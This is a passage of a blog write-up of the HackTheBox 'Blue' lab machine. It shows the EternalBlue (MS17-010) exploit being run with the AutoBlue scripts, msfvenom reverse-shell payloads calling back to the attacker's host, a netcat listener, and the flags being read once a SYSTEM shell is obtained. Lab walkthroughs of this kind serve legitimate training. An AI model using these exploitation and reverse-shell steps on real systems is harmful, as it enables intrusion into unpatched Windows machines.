+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# searchsploit ms17-010|grep -i &quot;windows 7&quot;</span>
+<span class="err">Microsoft Windows 7/2008 R2 - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)                                                                     | exploits/windows/remote/42031.py</span>
+<span class="err">Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)                                                 | exploits/windows/remote/42315.py</span>
+</pre></div>
+
+
+<p>I struggled a bit with both the above exploits because they require for you to get some parameters right, such us pipes. In my opinion they are not well documented and getting the parameters right is quite time consuming. Since EthernalBlue is very well known, there are a lot of scripts out there so I decided to try something different and easier. This project https://github.com/3ndG4me/AutoBlue-MS17-010.git ended up being what I was looking for. </p>
+<p>First thing first, I clone the project:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/blue# git clone  https://github.com/3ndG4me/AutoBlue-MS17-010.git                                                                                    </span>
+<span class="err">Cloning into &#39;AutoBlue-MS17-010&#39;...                                                            </span>
+<span class="c">remote: Enumerating objects: 26, done.                                                                                                                                                        </span>
+<span class="c">remote: Counting objects: 100% (26/26), done.                                                  </span>
+<span class="c">remote: Compressing objects: 100% (25/25), done.                                                                                                                                              </span>
+<span class="c">remote: Total 102 (delta 12), reused 5 (delta 1), pack-reused 76                                                                                                                              </span>
+<span class="err">Receiving objects: 100% (102/102), 77.30 KiB | 210.00 KiB/s, done.                                                                                                                            </span>
+<span class="err">Resolving deltas: 100% (52/52), done.   </span>
+</pre></div>
+
+
+<p>Then I ran the shell_prep.sh script:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">blue</span><span class="o">/</span><span class="n">AutoBlue</span><span class="o">-</span><span class="n">MS17</span><span class="o">-</span><span class="mi">010</span><span class="o">/</span><span class="n">shellcode</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">shell_prep</span><span class="p">.</span><span class="n">sh</span><span class="w">                                                                                                    </span>
+<span class="w">                 </span><span class="n">_</span><span class="p">.</span><span class="o">-</span><span class="p">;;</span><span class="o">-</span><span class="p">.</span><span class="n">_</span><span class="w">                      </span>
+<span class="w">          </span><span class="s1">&#39;-..-&#39;</span><span class="o">|</span><span class="w">   </span><span class="o">||</span><span class="w">   </span><span class="o">|</span><span class="w">                     </span>
+<span class="w">          </span><span class="s1">&#39;-..-&#39;</span><span class="o">|</span><span class="n">_</span><span class="p">.</span><span class="o">-</span><span class="p">;;</span><span class="o">-</span><span class="p">.</span><span class="n">_</span><span class="o">|</span><span class="w">                     </span>
+<span class="w">          </span><span class="s1">&#39;-..-&#39;</span><span class="o">|</span><span class="w">   </span><span class="o">||</span><span class="w">   </span><span class="o">|</span><span class="w">                     </span>
+<span class="w">          </span><span class="s1">&#39;-..-&#39;</span><span class="o">|</span><span class="n">_</span><span class="p">.</span><span class="o">-</span><span class="s1">&#39;&#39;</span><span class="o">-</span><span class="p">.</span><span class="n">_</span><span class="o">|</span><span class="w">                                                                     </span>
+<span class="n">Eternal</span><span class="w"> </span><span class="n">Blue</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Shellcode</span><span class="w"> </span><span class="n">Compiler</span><span class="w">                                                        </span>
+
+<span class="n">Let</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">compile</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="n">windoos</span><span class="w"> </span><span class="n">shellcodezzz</span><span class="w">                                                        </span>
+
+<span class="n">Compiling</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="n">kernel</span><span class="w"> </span><span class="n">shellcode</span><span class="w">                                                                 </span>
+<span class="n">Compiling</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="n">kernel</span><span class="w"> </span><span class="n">shellcode</span><span class="w">                                                                 </span>
+<span class="n">kernel</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="n">compiled</span><span class="p">,</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="ow">like</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">auto</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nf">reverse</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">msfvenom</span><span class="vm">?</span><span class="w"> </span><span class="p">(</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">)</span><span class="w">                                                                                               </span>
+<span class="n">Y</span><span class="w">                                              </span>
+<span class="n">LHOST</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nf">reverse</span><span class="w"> </span><span class="k">connection</span><span class="err">:</span><span class="w">                                                                  </span>
+<span class="mf">10.10.14.3</span><span class="w">                                     </span>
+<span class="n">LPORT</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="k">on</span><span class="err">:</span><span class="w">                                                               </span>
+<span class="mi">9990</span><span class="w">                                           </span>
+<span class="n">LPORT</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="k">on</span><span class="err">:</span><span class="w">                                                               </span>
+<span class="mi">9991</span><span class="w">                                           </span>
+<span class="n">Type</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">meterpreter</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">regular</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">shell</span><span class="w">                                                                                                                   </span>
+<span class="mi">1</span><span class="w">                                              </span>
+<span class="n">Type</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">staged</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">stageless</span><span class="w"> </span><span class="n">payload</span><span class="w">                                                                                                                      </span>
+<span class="mi">1</span><span class="w">                                              </span>
+<span class="n">Generating</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="p">(</span><span class="n">stageless</span><span class="p">)...</span><span class="w">                                                        </span>
+
+<span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">sc_x64_msf</span><span class="p">.</span><span class="n">bin</span><span class="w"> </span><span class="n">EXITFUNC</span><span class="o">=</span><span class="n">thread</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=</span><span class="mf">10.10.14.3</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">9990</span><span class="w">                                                                                </span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">platform</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">selected</span><span class="p">,</span><span class="w"> </span><span class="n">choosing</span><span class="w"> </span><span class="nl">Msf</span><span class="p">:</span><span class="err">:</span><span class="k">Module</span><span class="o">::</span><span class="nl">Platform</span><span class="p">:</span><span class="err">:</span><span class="n">Windows</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w">                                                                                                        </span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">arch</span><span class="w"> </span><span class="n">selected</span><span class="p">,</span><span class="w"> </span><span class="n">selecting</span><span class="w"> </span><span class="nl">arch</span><span class="p">:</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w">                                     </span>
+<span class="k">No</span><span class="w"> </span><span class="n">encoder</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">badchars</span><span class="w"> </span><span class="n">specified</span><span class="p">,</span><span class="w"> </span><span class="n">outputting</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="n">payload</span><span class="w">                                       </span>
+<span class="n">Payload</span><span class="w"> </span><span class="k">size</span><span class="err">:</span><span class="w"> </span><span class="mi">460</span><span class="w"> </span><span class="n">bytes</span><span class="w">                        </span>
+<span class="n">Saved</span><span class="w"> </span><span class="k">as</span><span class="err">:</span><span class="w"> </span><span class="n">sc_x64_msf</span><span class="p">.</span><span class="n">bin</span><span class="w">                       </span>
+
+<span class="n">Generating</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="p">(</span><span class="n">stageless</span><span class="p">)...</span><span class="w">                                                        </span>
+
+<span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">sc_x86_msf</span><span class="p">.</span><span class="n">bin</span><span class="w"> </span><span class="n">EXITFUNC</span><span class="o">=</span><span class="n">thread</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=</span><span class="mf">10.10.14.3</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">9991</span><span class="w">                                                                                    </span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">platform</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">selected</span><span class="p">,</span><span class="w"> </span><span class="n">choosing</span><span class="w"> </span><span class="nl">Msf</span><span class="p">:</span><span class="err">:</span><span class="k">Module</span><span class="o">::</span><span class="nl">Platform</span><span class="p">:</span><span class="err">:</span><span class="n">Windows</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w">                                                                                                        </span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">arch</span><span class="w"> </span><span class="n">selected</span><span class="p">,</span><span class="w"> </span><span class="n">selecting</span><span class="w"> </span><span class="nl">arch</span><span class="p">:</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w">                                     </span>
+<span class="k">No</span><span class="w"> </span><span class="n">encoder</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">badchars</span><span class="w"> </span><span class="n">specified</span><span class="p">,</span><span class="w"> </span><span class="n">outputting</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="n">payload</span><span class="w">                                       </span>
+<span class="n">Payload</span><span class="w"> </span><span class="k">size</span><span class="err">:</span><span class="w"> </span><span class="mi">324</span><span class="w"> </span><span class="n">bytes</span><span class="w">                        </span>
+<span class="n">Saved</span><span class="w"> </span><span class="k">as</span><span class="err">:</span><span class="w"> </span><span class="n">sc_x86_msf</span><span class="p">.</span><span class="n">bin</span><span class="w">                       </span>
+
+<span class="n">MERGING</span><span class="w"> </span><span class="n">SHELLCODE</span><span class="w"> </span><span class="n">WOOOO</span><span class="err">!!!</span><span class="w">                     </span>
+<span class="n">DONE</span><span class="w">                           </span>
+</pre></div>
+
+
+<p>I can see few binary files being generated:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010/shellcode# ll                                                                                                                 </span>
+<span class="err">total 80                                       </span>
+<span class="err">-rw-rw-r-- 1 root root 20305 Feb 13 11:41 eternalblue_kshellcode_x64.asm                                                                                                                      </span>
+<span class="err">-rw-rw-r-- 1 root root 19862 Feb 13 11:41 eternalblue_kshellcode_x86.asm                                                                                                                      </span>
+<span class="err">-rw-rw-r-- 1 root root  1589 Feb 13 11:41 eternalblue_sc_merge.py                                                                                                                             </span>
+<span class="err">-rw-rw-r-- 1 root root  2203 Feb 13 11:47 sc_all.bin                                           </span>
+<span class="err">-rw-rw-r-- 1 root root  1232 Feb 13 11:47 sc_x64.bin                                           </span>
+<span class="err">-rw-rw-r-- 1 root root   772 Feb 13 11:46 sc_x64_kernel.bin                                                                                                                                   </span>
+<span class="err">-rw-rw-r-- 1 root root   460 Feb 13 11:46 sc_x64_msf.bin                                       </span>
+<span class="err">-rw-rw-r-- 1 root root   962 Feb 13 11:47 sc_x86.bin                                           </span>
+<span class="err">-rw-rw-r-- 1 root root   638 Feb 13 11:46 sc_x86_kernel.bin                                                                                                                                   </span>
+<span class="err">-rw-rw-r-- 1 root root   324 Feb 13 11:47 sc_x86_msf.bin                                       </span>
+<span class="err">-rwxrwxr-x 1 root root  4556 Feb 13 11:41 shell_prep.sh  </span>
+</pre></div>
+
+
+<p>Then after having set a netcat listener on port 9990 I run the exploit:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010# python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin </span>
+<span class="err">shellcode size: 2203                           </span>
+<span class="c">numGroomConn: 13                               </span>
+<span class="err">Target OS: Windows 7 Professional 7601 Service Pack 1                                          </span>
+<span class="err">SMB1 session setup allocate nonpaged pool success                                              </span>
+<span class="err">SMB1 session setup allocate nonpaged pool success                                              </span>
+<span class="err">good response status: INVALID_PARAMETER                                                        </span>
+<span class="err">done </span>
+</pre></div>
+
+
+<p>and netcat shows I got a shell on the windows machine:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">9990</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9990</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.3</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.40</span><span class="o">]</span><span class="w"> </span><span class="mi">49160</span><span class="w"></span>
+<span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="o">[</span><span class="n">Version 6.1.7601</span><span class="o">]</span><span class="w"></span>
+<span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2009</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Corporation</span><span class="p">.</span><span class="w">  </span><span class="ow">All</span><span class="w"> </span><span class="n">rights</span><span class="w"> </span><span class="n">reserved</span><span class="p">.</span><span class="w"></span>
+
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="w"></span>
+</pre></div>
+
+
+<p>I looked around and found the user.txt in the following location:</p>
+<div class="highlight"><pre><span></span><span class="c">C:\Users\haris\Desktop&gt;more user.txt</span>
+<span class="err">more user.txt</span>
+<span class="err">4c****************************a9</span>
+</pre></div>
+
+
+<p>and similarly the root.txt:</p>
+<div class="highlight"><pre><span></span><span class="c">C:\Users\Administrator\Desktop&gt;more root.txt</span>
+<span class="err">more root.txt</span>
+<span class="err">ff****************************17</span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
